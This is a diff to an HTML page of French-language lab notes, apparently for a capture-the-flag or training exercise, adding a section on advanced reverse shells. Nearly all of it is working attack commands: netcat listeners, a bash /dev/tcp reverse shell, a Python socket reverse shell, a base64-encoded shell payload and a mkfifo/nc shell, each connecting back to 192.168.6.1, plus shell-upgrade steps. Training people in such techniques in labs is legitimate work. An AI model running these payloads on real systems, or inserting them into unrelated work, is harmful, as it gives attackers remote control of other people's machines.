@@ -1411,7 +1411,133 @@ exploit
 <pre><code>cat C:\\secret.txt</code></pre>
 
   </div>
-  <div id="s15" class="content"><div class="section-title">XV. Reverse Shells – Advanced</div></div>
+  <div id="s15" class="content"><div class="section-title">XV. Reverse Shells – Advanced</div>
+  <h3>🎧 Listener</h3>
+
+<p>Lancez un listener Netcat :</p>
+
+<pre><code>nc -lnvp 8000</code></pre>
+
+<hr>
+
+<h3>🔁 Reverse Shell (Bash)</h3>
+
+<p>
+  Pour obtenir votre reverse shell, commencez par vérifier votre adresse IP avec :
+</p>
+
+<pre><code>ifconfig</code></pre>
+
+<p>L’interface indiquée est : <b>enp1s9</b>.</p>
+
+<p>
+  La consigne impose le port : <b>8000</b>.
+</p>
+
+<p>Utilisez la commande suivante dans le panneau admin :</p>
+
+<pre><code>bash -i >& /dev/tcp/192.168.6.1/8000 0>&1</code></pre>
+
+<p>
+  Une fois la connexion établie dans le terminal listener, vérifiez le terminal :
+</p>
+
+<pre><code>tty</code></pre>
+
+<hr>
+
+<h3>⬆️ Améliorer le Shell (Upgrade)</h3>
+
+<p>Dans votre reverse shell :</p>
+
+<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo
+fg
+reset
+</code></pre>
+
+<p>Le type de terminal à sélectionner : <b>xterm</b>.</p>
+
+<p>Ensuite :</p>
+
+<pre><code>reveal-answer</code></pre>
+
+<hr>
+
+<h3>🐍 Reverse Shell Python (Sockets)</h3>
+
+<h4>1️⃣ Lancez un listener sur votre machine :</h4>
+
+<pre><code>nc -lnvp 8001</code></pre>
+
+<h4>2️⃣ Dans l’interpréteur Python distant, envoyez :</h4>
+
+<pre><code>import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.6.1",8001))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+</code></pre>
+
+<h4>3️⃣ Upgrade du shell (idem) :</h4>
+
+<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo
+fg
+reset
+</code></pre>
+
+<p>Puis :</p>
+
+<pre><code>reveal-answer</code></pre>
+
+<hr>
+
+<h3>🔐 Base64 Encoding</h3>
+
+<p><b>Encoder une chaîne :</b></p>
+
+<pre><code>echo -n 'Base64 helps you deal with problematic characters: ,.<>/?\|!@#$%^&*()' | base64 -w0</code></pre>
+
+<p><b>Décoder une chaîne :</b></p>
+
+<pre><code>echo 'Z29vZCBqb2IhCg==' | base64 -d</code></pre>
+
+<p><b>Encoder un payload :</b></p>
+
+<pre><code>echo -n 'bash -i >& /dev/tcp/192.168.6.1/8002 0>&1' | base64 -w0</code></pre>
+
+<hr>
+
+<h3>📦 mkfifo Reverse Shell</h3>
+
+<h4>1️⃣ Démarrer un listener :</h4>
+
+<pre><code>nc -lnvp 8003</code></pre>
+
+<h4>2️⃣ Exécuter la commande suivante dans le panneau admin :</h4>
+
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.6.1 8003 >/tmp/f
+</code></pre>
+
+<h4>3️⃣ Améliorer le shell :</h4>
+
+<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo
+fg
+reset
+</code></pre>
+
+<h4>4️⃣ Obtenir la réponse :</h4>
+
+<pre><code>reveal-answer</code></pre>
+
+  </div>
   <div id="s16" class="content"><div class="section-title">XVI. Exfiltration – Advanced</div></div>
 
 </div>
